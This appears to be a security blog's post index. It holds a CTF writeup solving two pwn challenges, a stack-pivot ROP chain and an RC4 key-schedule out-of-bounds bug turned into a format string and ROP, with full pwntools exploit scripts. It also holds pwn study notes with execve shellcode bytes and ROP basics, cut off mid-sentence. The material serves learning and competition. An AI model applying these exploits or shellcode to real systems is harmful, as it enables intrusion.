[ { "title": "[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense", "url": "/posts/mimic-writeup/", "categories": "Pwnable", "tags": "writeup, stack pivot, rop", "date": "2025-12-01 07:00:00 +0700", "content": "Preface Hello, this is my first writeup about pwnable. My team(BKISC) and I participated in Cyber Mimic Defense 2025 in November. Here‚Äôs the writeups about 2 stack pivot challenges that I solved during the competition. [Quals] stack Analysis Source: pwn / libc / ld The main function looks like this: __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_401236(a1, a2, a3); puts(\"Welcome\"); sub_401354(); sub_4013B9(); sub_4013ED(); return 0; } The function sub_401236() sets up I/O and seccomp ban execve and execveat via prctl(). int sub_401236() { int result; // eax setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); if ( prctl(38, 1, 0, 0, 0) &lt; 0 ) { perror(\"prctl(PR_SET_NO_NEW_PRIVS)\"); exit(1); } result = prctl(22, 2, &amp;unk_404060); if ( result &lt; 0 ) { perror(\"prctl(PR_SET_SECCOMP)\"); exit(1); } return result; } Dump of seccomp-tools: seccomp-tools dump ./pwn line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000 return KILL 0005: 0x15 0x00 0x01 0x00000142 if (A != execveat) goto 0007 0006: 0x06 0x00 0x00 0x00000000 return KILL 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW A mmap func sub_401317() but doesn‚Äôt call anywhere: int sub_401317() { puts(\"You are so lucky!\"); puts(\"Here is your gift:\"); return mprotect(0, 0x1000u, 1); } First, there‚Äôs a small overflow in sub_401354(), we can use it to leak stack int sub_401354() { char s[16]; // [rsp+0h] [rbp-10h] BYREF memset(s, 0, sizeof(s)); puts(\"Could you tell me your name?\"); read(0, s, 24u); return printf(\"Hello, %s!\\n\", s); } A bigger overflow in sub_4013B9() ssize_t sub_4013B9() { _BYTE buf[96]; // [rsp+0h] [rbp-60h] BYREF puts(\"Any thing else?\"); return read(0, buf, 0x200u); } Exit function sub_4013ED(): signed __int64 sub_4013ED() { puts(\"Goodbye!\"); return sys_exit(0); } Exploitation I usually checksec the binary before starting the exploit to have an overview of the protections. Even though checksec reports SHSTK/IBT enabled, in this challenge they don‚Äôt seem to be actually enforced (no CET signal when doing plain ROP). checksec ./pwn [*] '/mnt/d/ctf/mimic/2025/stack/pwn' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled I first leak stack through sub_401354() and it also save rbp of main. Then in sub_4013B9() I keep rbp to the stack I leaked, overwrite return address to sub_401354()+5 as well as overwrite __libc_start_call_main+128 to __libc_start_call_main+102. The idea is to reuse main‚Äôs caller frame: by setting the saved rbp to main‚Äôs frame and jumping into sub_401354()+5, the value that originally was the return address of main (__libc_start_call_main+128) becomes the return address of sub_401354(). With 0x18 bytes of padding, we fully overwrite the buffer and reach the slot that holds the return address of main (now is __libc_start_call_main+102). After that, when sub_401354() returns, it will jump to __libc_start_call_main+102, which eventually calls main() again. .text:0000000000401354 ; int sub_401354() .text:0000000000401354 sub_401354 proc near ; CODE XREF: main+26‚Üìp .text:0000000000401354 .text:0000000000401354 s = byte ptr -10h .text:0000000000401354 .text:0000000000401354 ; __unwind { .text:0000000000401354 endbr64 .text:0000000000401358 push rbp .text:0000000000401359 mov rbp, rsp .text:000000000040135C sub rsp, 10h Stack layout in sub_4013B9(): pwndbg&gt; tel rsi 50 00:0000‚îÇ rax rsi rsp 0x7fffb69d8ef0 ‚Äî‚ñ∏ 0x40205a ‚óÇ‚Äî 'Could you tell me your name?' 01:0008‚îÇ-058 0x7fffb69d8ef8 ‚Äî‚ñ∏ 0x7ed6bf0f6faa (puts+346) ‚óÇ‚Äî cmp eax, -1 02:0010‚îÇ-050 0x7fffb69d8f00 ‚óÇ‚Äî 7 03:0018‚îÇ-048 0x7fffb69d8f08 ‚Äî‚ñ∏ 0x7ed6bf291780 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad2887 04:0020‚îÇ-040 0x7fffb69d8f10 ‚óÇ‚Äî 0 05:0028‚îÇ-038 0x7fffb69d8f18 ‚Äî‚ñ∏ 0x7fffb69d8f50 ‚Äî‚ñ∏ 0x7fffb69d8f60 ‚óÇ‚Äî 1 06:0030‚îÇ-030 0x7fffb69d8f20 ‚Äî‚ñ∏ 0x7fffb69d9078 ‚Äî‚ñ∏ 0x7fffb69dade1 ‚óÇ‚Äî '/mnt/d/ctf/mimic/2025/stack/pwn_patched' 07:0038‚îÇ-028 0x7fffb69d8f28 ‚Äî‚ñ∏ 0x401413 ‚óÇ‚Äî endbr64 08:0040‚îÇ-020 0x7fffb69d8f30 ‚Äî‚ñ∏ 0x403d98 ‚Äî‚ñ∏ 0x401200 ‚óÇ‚Äî endbr64 09:0048‚îÇ-018 0x7fffb69d8f38 ‚Äî‚ñ∏ 0x4013b6 ‚óÇ‚Äî nop 0a:0050‚îÇ-010 0x7fffb69d8f40 ‚óÇ‚Äî 0x4141414141414141 ('AAAAAAAA') 0b:0058‚îÇ-008 0x7fffb69d8f48 ‚óÇ‚Äî 0x4141414141414141 ('AAAAAAAA') =&gt; stack leaked 0c:0060‚îÇ rbp 0x7fffb69d8f50 ‚Äî‚ñ∏ 0x7fffb69d8f60 ‚óÇ‚Äî 1 =&gt; ret to sub_401354()+5 0d:0068‚îÇ+008 0x7fffb69d8f58 ‚Äî‚ñ∏ 0x401448 ‚óÇ‚Äî mov eax, 0 0e:0070‚îÇ+010 0x7fffb69d8f60 ‚óÇ‚Äî 1 =&gt; change to +102 0f:0078‚îÇ+018 0x7fffb69d8f68 ‚Äî‚ñ∏ 0x7ed6bf09fd90 (__libc_start_call_main+128) ‚óÇ‚Äî mov edi, eax Call main inside libc_start_main After returning to main I build a second-stage ROP chain on the stack. Since the Dockerfile is not provided, we don‚Äôt know the exact flag path at compile time. I therefore use getdents64 to list directory entries at runtime, leak the flag filename, and then perform a standard open-read-write (ORW) chain. Flow: sub_401354() =&gt; leak stack =&gt; sub_4013B9() =&gt; sub_401354() =&gt; leak libc =&gt; __libc_start_call_main =&gt; main() =&gt; leak flag path =&gt; orw Result of getdents64 at /: \\xdb\\x05\\xa5B\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x04. \\x00\\x00\\x00\\x00\\xbcBC\\x04\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x04.. \\x00\\x00\\x00\\xdc\\x05\\xa5B\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x08. bash_logout\\x00\\xdd\\x05\\xa5B\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08. bashrc\\x00\\x00\\x00\\x00\\x00\\x00\\xde\\x05\\xa5B\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x08. profile\\x00\\x00\\x00\\x00\\x00\\xde\\x08\\xa5B\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x08vuln\\x00\\xdf\\x05\\xa5B\\x00\\x00\\ x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x08flag\\x00\\x84\\x16\\x90\\x87\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x0 0\\x04bin\\x00\\x00d”æ\\xc3\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x04dev\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 Click to view solve.py #!/usr/bin/env python3 from pwn import * exe = ELF(\"./pwn_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") HOST=\"pwn-42c1acba80.challenge.xctf.org.cn\" PORT=9999 context.binary = exe context.log_level = 'debug' gdbscript=\"\"\" b*0x0000000000401338 b*0x00000000004013B1 b*0x4013eb \"\"\" def run(): if args.LOCAL: p = process([exe.path]) gdb.attach(p, api=True, gdbscript=gdbscript) else: p = remote(HOST, PORT, ssl=True) return p p = run() info = lambda msg: log.info(msg) success = lambda msg: log.success(msg) sla = lambda msg, data: p.sendlineafter(msg, data) sna = lambda msg, data: p.sendlineafter(msg, str(data).encode()) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) sn = lambda data: p.sendline(str(data).encode()) s = lambda data: p.send(data) ru = lambda msg: p.recvuntil(msg) rl = lambda: p.recvline().strip() rn = lambda n: p.recvn(n) rbp = 0x000000000040121d main = 0x0000000000401413 sa(b\"name?\\n\", b\"A\"*16) ru(b\"A\"*16) stack = u64(p.recvn(6).ljust(8, b\"\\x00\")) success(\"stack \" + hex(stack)) sa(b\"else?\\n\", b\"B\"*96 + p64(stack) + p64(0x401359) + p64(0) + b'\\x76') sa(b\"name?\\n\", b\"A\"*24) ru(b\"A\"*24) libc.address = u64(p.recv(6).ljust(8, b'\\x00')) - 171382 success(f'libc base: {hex(libc.address)}') rop = ROP(libc) pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] pop_rdx_rbx = libc.address + 0x00000000000904a9 pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] ret = pop_rdi + 1 openat = libc.symbols['openat'] getdents64 = libc.symbols['getdents64'] write = libc.symbols['write'] read_plt = exe.plt['read'] sendfile = libc.symbols['sendfile'] bss = 0x404100 path = bss buff = bss + 0x100 buf_sz = 0x100 AT_FDCWD = -100 O_DIRECTORY = 0x10000 O_RDONLY = 0 # listfile = flat( # pop_rdi, 0, # pop_rsi, path, # pop_rdx_rbx, 0x100, 0, # read_plt, # # 2) fd = openat(AT_FDCWD, PATH, O_DIRECTORY, 0) # pop_rdi, AT_FDCWD, # pop_rsi, path, # pop_rdx_rbx, O_DIRECTORY, 0, # openat, # # 3) getdents64(fd=3, BUF, BUFSZ) # pop_rdi, 3, # pop_rsi, buff, # pop_rdx_rbx, buf_sz, 0, # getdents64, # # 4) write(1, BUF, BUFSZ) # pop_rdi, 1, # pop_rsi, buff, # pop_rdx_rbx, buf_sz, 0, # write, # ) # sa(b\"name?\\n\", b\"A\"*16) # payload = b\"B\"*96 + b\"C\"*8 + listfile # sa(b\"else?\\n\", payload) # pause() # s(b\"/\\x00\") orw = flat( pop_rdi, 0, pop_rsi, path, pop_rdx_rbx, 0x100, 0, read_plt, # 2) pop_rdi, AT_FDCWD, pop_rsi, path, pop_rdx_rbx, 0, 0, openat, # 3) pop_rdi, 3, pop_rsi, buff, pop_rdx_rbx, buf_sz, 0, read_plt, # 4) write(1, BUF, BUFSZ) pop_rdi, 1, pop_rsi, buff, pop_rdx_rbx, buf_sz, 0, write, ) sa(b\"name?\\n\", b\"A\"*16) payload = b\"B\"*96 + b\"C\"*8 + orw sa(b\"else?\\n\", payload) pause() s(b\"./flag\\x00\") p.interactive() Flag: flag{OerBsSljF3pcjeKMrR2j1Bh8evAMeYZK} [Finals] leak4 Analysis Source: pwn / libc / ld Init fun setup I/O and disable execve/execveat: void __cdecl init() { setvbuf(stdin, 0, 2, 0); setvbuf(_bss_start, 0, 2, 0); disable_execve(); alarm(0x3Cu); } void __cdecl disable_execve() { scmp_filter_ctx ctx; // [rsp+8h] [rbp-8h] ctx = (scmp_filter_ctx)seccomp_init(2147418112); seccomp_rule_add(ctx, 0, 59, 0); seccomp_rule_add(ctx, 0, 322, 0); if ( (int)seccomp_load(ctx) &lt; 0 ) { perror(\"seccomp_load\"); seccomp_release(ctx); exit(1); } seccomp_release(ctx); } seccomp-tools dump ./chal line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x06 0xc000003e if (A != ARCH_X86_64) goto 0008 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x03 0xffffffff if (A != 0xffffffff) goto 0008 0005: 0x15 0x02 0x00 0x0000003b if (A == execve) goto 0008 0006: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x06 0x00 0x00 0x00000000 return KILL The program follows a standard RC4 encryption routine structure: main(): Allocates a struct protect1 on the heap, reads a Key, initializes the RC4 state array S with value 0-127, schedules the key, reads Data, and encrypts it. 00000000 struct protect1 // sizeof=0x100 00000000 { 00000000 char input[128]; 00000080 char data[128]; 00000100 }; key_schedule(): The KSA (Key Scheduling Algorithm) phase of RC4. It permutes the state array S based on the user-provided key. rc4_crypt(): The PRGA (Pseudo-Random Generation Algorithm) phase. It generates the keystream and XORs it with the data. In key_schedule(), there‚Äôs a OOB bug when computing idx j: j = (buf[i_1] + j + input2[i_1]) % 128; Both buf and input2 are signed char which range is typically -128 to 127. The % operator keeps the sign of the dividend so j can be negative. Because j is bounded by [-127, 127], the out-of-bounds region is limited to a window of up to 127 bytes below S[0], but this is still enough to corrupt important stack values. And after debugging, I found that at offset -40 we can overwrite the return address of key_schedule() or overwrite rbp with offset -48. void __cdecl key_schedule(char *input, char *input2, size_t inputlen) { char tmp; // [rsp+2Fh] [rbp-A1h] int j; // [rsp+30h] [rbp-A0h] int i_0; // [rsp+34h] [rbp-9Ch] int i_1; // [rsp+38h] [rbp-98h] char buf[136]; // [rsp+40h] [rbp-90h] BYREF unsigned __int64 v8; // [rsp+C8h] [rbp-8h] v8 = __readfsqword(0x28u); j = 0; memset(buf, 0, 128); for ( i_0 = 0; i_0 &lt;= 127; ++i_0 ) buf[i_0] = input[i_0 % inputlen]; for ( i_1 = 0; i_1 &lt;= 127; ++i_1 ) { j = (buf[i_1] + j + input2[i_1]) % 128; tmp = input2[i_1]; input2[i_1] = input2[j]; input2[j] = tmp; } } Exploitation Checksec results: checksec File: /mnt/d/ctf/mimic/2025/final/leak4/chal_patched Arch: amd64 RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' SHSTK: Enabled IBT: Enabled Stripped: No Debuginfo: Yes Again, I think they don‚Äôt actually enforce SHSTK/IBT in this challenge. I also noticed that when key_schedule() return, the register rdi still holds our first argument, which is the pointer to our input buffer(p-&gt;input). By overwriting the return address of key_schedule() to point to the printf(\"Enter the key-&gt;\") call inside main (e.g. main+0x3b), we effectively call printf with our input buffer as the format string. That turns this into a format string vulnerability, which can be used to leak stack and libc addresses. Note that the key_schedule-based OOB write is mathematically limited. The RC4 state S is initialized as S[i] = i for 0 ‚â§ i &lt; 128 and only permuted by swaps; it never stores values outside 0..127. Since our out-of-bounds writes are always input2[j] = tmp where tmp is one element of S, the bytes we can write outside the array are also restricted to the range 0x00..0x7f. Moreover, the index j is computed as (buf[i] + j + S[i]) % 128 using signed char and signed %, so j is always in [-127, 127]. This means we can only corrupt a small window of stack memory around S, and at each location we can only place a value from 0..127. As a result, we need a bit brute-force to find the right input key to overwrite the target addresses. After that, we can overwrite the lower two bytes of rbp (with some bruteforce) to change where p is stored. My first idea was to tweak p so that we could overwrite the return address of rc4_crypt() and jump directly into a ROP chain. However, in practice it was quite hard to control both the value and the key cleanly, so I took a step back and looked for a nicer target. That‚Äôs when I noticed an interesting pointer in stack. Let‚Äôs look at leave; ret of key_schedule(): target ptr: 0x7fff64cc3e00 ‚Äî‚ñ∏ 0x7fff64cc3e10 RBP 0x7fff64cc3ec0 ‚Äî‚ñ∏ overwrited by us 0x644da6b6d5c0 &lt;key_schedule+513&gt; leave 0x644da6b6d5c1 &lt;key_schedule+514&gt; ret From the stack layout of main, we know: -0000000000000130 -0000000000000130 int i; -000000000000012C int i_0; -0000000000000128 protect1 *p; -0000000000000120 size_t len; -0000000000000118 size_t datalen; -0000000000000110 char S[128]; -0000000000000090 char S_backup[136]; -0000000000000008 _QWORD var_8; +0000000000000000 _QWORD __saved_registers; +0000000000000008 _UNKNOWN *__return_address; +0000000000000010 +0000000000000010 // end of stack variables The variable p lives at [rbp - 0x128] so the rbp must be 0x7fff64cc3e00+0x128=0x7fff64cc3f28. After that, the p* now is 0x7fff64cc3e10. Because struct protect1 is: 00000000 struct protect1 // sizeof=0x100 00000000 { 00000000 char input[128]; 00000080 char data[128]; 00000100 }; the field p-&gt;data is at p + 0x80, so the next read into p-&gt;data will write to: p-&gt;data = 0x7fff64cc3e10 + 0x80 = 0x7fff64cc3e90 Now look at what happens when key_schedule() returns. The epilogue is the usual leave; ret: mov rsp, rbp ; rsp = 0x7fff64cc3ec0 pop rbp ; rbp = 0x7fff64cc3f28 ; rsp = 0x7fff64cc3ec8 pop rip ; rip = [rsp] = 0x644da6b6d7e4 (main+216) ; rsp = 0x7fff64cc3ed0 So after returning to main, the stack pointer is at rsp = 0x7fff64cc3ed0. When main later calls read, the CPU executes call read@plt which pushes the return address at [rsp - 8]. That means the return address of read() is stored at: 0x7fff64cc3ec8 At the same time, our buf argument to read is p-&gt;data = 0x7fff64cc3e90: 0x644da6b6d848 &lt;main+316&gt; call read@plt &lt;read@plt&gt; fd: 0 (pipe:[1032699]) buf: 0x7fff64cc3e90 ‚óÇ‚Äî 0x191a1b1c1d1e1f20 nbytes: 0x80 You can easily find that there‚Äôs a buffer overflow inside read(). With 0x38 bytes of padding, we can overwrite the return address of read() to our ROP chain. Because there‚Äôs a seccomp that blocks execve/execveat, we have to ORW(open-read-write) flag. I‚Äôll put the string /flag at the start of the overflow buffer and then use the first ROP chain to read a larger second-stage ROP payload into memory (since the overflowed stack space is quite small). The second stage then opens /flag, reads, and writes to stdout. Click to view solve.py #!/usr/bin/env python3 from pwn import * exe = ELF(\"./chal_patched\") libc = ELF(\"./libc.so.6\", checksec=False) HOST=\"172.31.14.13\" PORT=9999 context.binary = exe context.log_level = 'debug' gdbscript = ''' # b*$rebase(0x000000000000152E) b*$rebase(0x00000000000015C0) b*$rebase(0x0000000000001848) b*$rebase(0x000000000000170B) ''' def run(): if args.LOCAL: p = process([exe.path]) gdb.attach(p, api=True, gdbscript=gdbscript) else: p = remote(HOST, PORT) return p p = run() info = lambda msg: log.info(msg) success = lambda msg: log.success(msg) sla = lambda msg, data: p.sendlineafter(msg, data) sna = lambda msg, data: p.sendlineafter(msg, str(data).encode()) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) sn = lambda data: p.sendline(str(data).encode()) s = lambda data: p.send(data) ru = lambda msg: p.recvuntil(msg) rl = lambda: p.recvline().strip() rn = lambda n: p.recvn(n) def gen(target_idx, desired_byte, fmt_string=\"%45$p\"): key = bytearray(128) S = list(range(128)) j = 0 fmt_bytes = fmt_string.encode() fmt_len = len(fmt_bytes) for i in range(fmt_len): key[i] = fmt_bytes[i] j = (S[i] + j + key[i]) % 128 S[i], S[j] = S[j], S[i] fix_idx = fmt_len needed_k = (-S[fix_idx] - j) % 128 key[fix_idx] = needed_k j = (S[fix_idx] + j + key[fix_idx]) % 128 S[fix_idx], S[j] = S[j], S[fix_idx] trigger = desired_byte for i in range(fix_idx + 1, trigger): key[i] = (128 - S[i]) % 128 S[i], S[0] = S[0], S[i] key[trigger] = (target_idx - S[trigger]) &amp; 0xff next_i = trigger + 1 if next_i &lt; 128: key[next_i] = (-S[next_i] - target_idx) % 128 for i in range(next_i + 1, 128): key[i] = (128 - S[i]) % 128 return bytes(key) def gen_auto(targets): targets = sorted(targets, key=lambda x: x[1]) for k in range(len(targets) - 1): if targets[k+1][1] &lt;= targets[k][1] + 1: raise ValueError(f\"Conflict: Byte {hex(targets[k][1])} and {hex(targets[k+1][1])} are too close (gap &lt; 2).\") key = bytearray(128) S = list(range(128)) j = 0 last_i = -1 for target_idx, trigger_byte in targets: for i in range(last_i + 1, trigger_byte): key[i] = (128 - S[i]) % 128 S[i], S[0] = S[0], S[i] key[trigger_byte] = (target_idx - S[trigger_byte]) &amp; 0xff j = target_idx if 0 &lt;= j &lt; 128: S[trigger_byte], S[j] = S[j], S[trigger_byte] reset_idx = trigger_byte + 1 if reset_idx &lt; 128: key[reset_idx] = (-S[reset_idx] - target_idx) % 128 j = 0 S[reset_idx], S[0] = S[0], S[reset_idx] last_i = reset_idx else: last_i = 128 if last_i &lt; 127: for i in range(last_i + 1, 128): key[i] = (128 - S[i]) % 128 S[i], S[0] = S[0], S[i] return bytes(key) p.sendafter(b'Enter the key-&gt;', gen(-40, 0x47, \"\\n%45$p\")) p.recvline() leak = int(p.recvn(14), 16) libc.address = leak - libc.symbols['__libc_start_main'] - 243 payload2 = gen(-40, 0x47, \"\\n%35$p\") pause() p.send(payload2) p.recvline() stack = int(p.recvn(14), 16) log.info(f\"libc: {hex(libc.address)}\") log.info(f\"stack: {hex(stack)}\") target = stack - 0x1e7 + 0x128 log.info(f\"target: {hex(target-0x128)}\") log.info(f\"target+0x128: {hex(target)}\") log.info(f\"ret_rc4: {hex(target-0x11f)}\") log.info(f\"b1: {hex(target&amp;0xff)}, b2: {hex((target&gt;&gt;8)&amp;0xff)}\") my_targets = [ (-47, (target &amp; 0xff00) &gt;&gt; 8), (-48, target &amp; 0x00ff) ] pop_rdi = libc.address + 0x0000000000023b6a pop_rsi = libc.address + 0x000000000002601f pop_rdx_r12 = libc.address + 0x0000000000119431 pop_rcx_rbx = libc.address + 0x000000000010257e open = libc.symbols['open'] sendfile = libc.symbols['sendfile'] read = libc.symbols['read'] write = libc.symbols['write'] payload3 = gen_auto(my_targets) pause() p.send(payload3) path = stack - 0x157 abc = flat( pop_rdi, path, pop_rsi, 0, pop_rdx_r12, 0, 0, open, pop_rdi, 3, pop_rsi, stack, pop_rdx_r12, 0x50, 0, read, pop_rdi, 1, pop_rsi, stack, pop_rdx_r12, 0x50, 0, write ) read_more = flat( pop_rdi, 0, pop_rsi, path+0x78, pop_rdx_r12, 0x100, 0, read ) payload4 = b\"./flag.txt\\x00\".ljust(0x38, b'\\x00') + read_more p.sendafter(b'data-&gt;', payload4) pause() p.send(abc) p.interactive() Flag: flag{6WTv7A0crLU5r8r2UneKtxI5eLkQxRE1}" }, { "title": "üìì PWN STUDY NOTES", "url": "/posts/pwn-study-notes/", "categories": "Pwnable", "tags": "Study Notes, Tools", "date": "2025-03-23 07:00:00 +0700", "content": "üß† Computer Architecture + Operating System Registers Register Description rax Function return value ‚Üí rax, eax, ax, ah, al (64/32/16/8/8 bits) rbx Base register (no specific use in x64) rcx Counter register for loops rdx Data register rsi Source index (source in data movement) rdi Destination index (destination in data movement) rsp Stack pointer rbp Stack base pointer User-space function calls (System V i386 ABI) Arguments: pushed right ‚Üí left onto the stack. At callee entry: [esp+4]=arg1, [esp+8]=arg2, ‚Ä¶ Return: eax (or edx:eax), FP in st(0) Callee-saved: ebx, esi, edi, ebp (and esp) Caller-saved: eax, ecx, edx Stack alignment: ABI baseline 4 bytes; SIMD code may realign to 16 bytes in prologue. Linux i386 syscall convention (int 0x80) eax = syscall number. Args 1‚Äì6: ebx, ecx, edx, esi, edi, ebp Return: eax (‚â•0 success; negative = -errno) Other regs not guaranteed preserved. Linux x86-64 syscall convention (syscall instruction) rax ‚Äî syscall number. Arguments (1‚Äì6): rdi, rsi, rdx, r10, r8, r9 Return value: rax (‚â• 0 on success; negative value = -errno) Other registers are preserved per usual rules (rbx, rbp, r12‚Äìr15 are callee-saved in user space). üß± MEMORY STRUCTURE OF LINUX PROCESS Code Segment (.text): executable code (r‚Äìx) Data Segment: initialized global/static variables (rw-) BSS Segment: uninitialized global/static variables (rw-) Heap Segment: dynamic memory allocation (rw-) Stack Segment: local variables, return addresses (rw-) Extra Segment: fs and gs (used by OS) ‚öôÔ∏è ASSEMBLY BASICS üîπ Opcodes Data Transfer: mov, lea Arithmetic: inc, dec, add, sub Logic: and, or, xor, not Comparison: cmp, test Branch: jmp, je, jg Stack: push, pop Procedure: call, ret, leave System call: syscall üîπ Memory Operands QWORD PTR [addr]: 8 bytes DWORD PTR [addr]: 4 bytes WORD PTR [rax]: 2 bytes BYTE PTR [rax]: 1 byte View more in: Computer Architecture Assembly OS üêõ Bugs üêö SHELLCODE üìå Target Call execve(\"/bin/sh\", NULL, NULL) to get a shell or control flow of the program. üß¨ Syscall convention for execve(/bin/sh, 0, 0) (x86_64) Register Role rax Syscall number (0x3b for execve) rdi arg0: filename (/bin/sh) rsi arg1: argv (NULL) rdx arg2: envp (NULL) üî© Shellcode (x86_64) mov rax, 0x68732f6e69622f ; \"/bin/sh\" in hex push rax mov rdi, rsp ; rdi = pointer to \"/bin/sh\" xor rsi, rsi ; rsi = NULL xor rdx, rdx ; rdx = NULL mov rax, 0x3b ; rax = syscall number for execve syscall Little-endian bytes \\x48\\xB8\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x50\\x48\\x89\\xE7\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x0F\\x05 üî© Shellcode (x86) xor eax, eax xor ecx, ecx xor edx, edx add eax, 0x0b ; syscall number for execve xor ebx, ebx push ebx push 0x68732f2f ; \"//sh\" push 0x6e69622f ; \"/bin\" mov ebx, esp int 0x80 ; syscall Little-endian bytes \\x31\\xC0\\x31\\xC9\\x31\\xD2\\x83\\xC0\\x0B\\x31\\xDB\\x53\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\xCD\\x80 üí• BUFFER OVERFLOW üßµ Input functions that can overflow gets(buf) ‚Äî do not use (removed in C11) No input length limit. Reads until '\\n', does not store the newline. Always appends '\\0'. Extremely unsafe ‚Üí classic stack overflow. scanf(\"%s\", buf) No input length limit. Reads until \" \", \\n, \\t. Behaves like gets(). scanf(\"%[width]s\", buf) Reads up to width characters. If width &gt; sizeof(buf) - 1 ‚Üí may overflow. Does not guarantee string null-termination (\\0). fgets(buf, len, stream) Reads up to len - 1 characters, always appends \\0. If input is longer, the excess remains in stdin. If input &lt; len, the remaining part is filled with \\0. If input = len, the last byte is discarded and \\0 is added. May lose data, e.g.: 30-byte buffer ‚Üí can only store 29 characters if len = 30. If there‚Äôs space, stores \"\\n\\0\". read(fd, buf, len) Reads up to len bytes into buf. Returns the number of bytes read (‚â• 0) or negative value on error. Does not guarantee null-termination (\\0). Safe only if len is less than or equal to the sizeof(buf). üìå Core Overflow types Stack Overflow: overwrite data on stack (return address, canary, ‚Ä¶). Heap Overflow: overwrites adjacent heap chunks/objects or allocator metadata. Global/Static Overflow: overwrites global variables or static data (.data/.bss). Off-by-one: overwrite one byte beyond buffer boundary, often affecting adjacent data. Out-of-bounds: access memory outside the allocated buffer. Integer Overflow/Underflow: occurs when an arithmetic operation produces a value outside the representable range of the integer type. üõ°Ô∏è CANARY (Stack Smashing Protector) üß† Purpose Prevents buffer overflow attacks by detecting overwrites of sensitive memory regions. If the canary is overwritten ‚Üí program will Segmentation fault and terminate immediately. üîê Structure Stored at: [rbp - 0x8]. Is a sequence of 8 random bytes, first byte is always \\x00. üîí NX &amp; ASLR üö´ NX (No-eXecute) Prevents Shellcode: Blocks execution of code in memory regions not marked as executable. üé≤ ASLR (Address Space Layout Randomization) Goal: Randomly allocates addresses for stack, heap, shared libraries, ‚Ä¶ each time the binary runs. Benefit: Makes it harder to guess addresses during exploitation. üîß Hook Overwrite Idea: Bypass RELRO by overwriting function pointers (like malloc(), free(), realloc()) with arbitrary addresses to execute malicious code. üìå PIE &amp; RELRO üîÄ PIE (Position-Independent Executable) Goal: Execute binary with a changing load address (base address), making exploitation harder. Operation: Each run, the binary is loaded at a random address, making address guessing more complex. üîÑ PIC (Position-Independent Code) Goal: Allows code to run correctly at any memory location. Features: Does not use absolute addresses. Relies on relative addresses (based on RIP on x86_64) for address calculations. Benefit: Increases flexibility and safety when programs are loaded at different addresses. üîó RELRO (RELocation Read-Only) Protection: Prevents overwriting the address table (GOT) to protect important functions from exploitation. Protection levels: No RELRO: GOT can be overwritten, easy to exploit. Partial RELRO: Some parts of GOT are made read-only after initialization. Full RELRO: Entire GOT is fully protected, very hard to exploit. üîÑ R2L-ROP üìå Basic concepts r2l (Return-to-libc): Uses ret to call existing libc functions, e.g.: system(\"/bin/sh\"). ROP (Return Oriented Programming): Uses chains of gadgets (instructions ending with ret) to control program flow. GOT (Global Offset Table): Table containing addresses of libc functions (e.g.: puts). PLT (Procedure Linkage Table): Used to call functions via GOT. Call a function: func_plt -&gt; func_got -&gt; func_libc üîß Technical details Padding Return Address: Return address is aligned to 16 bytes. I usually add a ret before gadgets like pop rdi; ret to avoid errors due to movaps. Finding function addresses: Typically, system is calculated as: system = libc_base + offset (see readelf -s libc.so.6 | grep \"system\" for exact offset) Finding ROP Gadgets: Use: ROP gadget --binary filename | grep \"gadget_to_find\" #search directly in process pop_rdi_ret = r.find_gadget(['pop rdi', 'ret'])[0] # Find registers ex: pop rdi ; ret Example: find gadget pop rdi; ret to set argument for system. Return to main to continue exploitation (e.symbols['main']) üìå Example on x64 Leak libc address: Use functions like puts to print the address stored in GOT. Example: use gadget pop rdi; ret to put the address of puts@got into rdi and then call puts(puts@got) (This will print the address of puts =&gt; Leak libc). Calculation: libc_base = leaked_address - puts_offset (libc.symbols['puts']) Find address of system and string 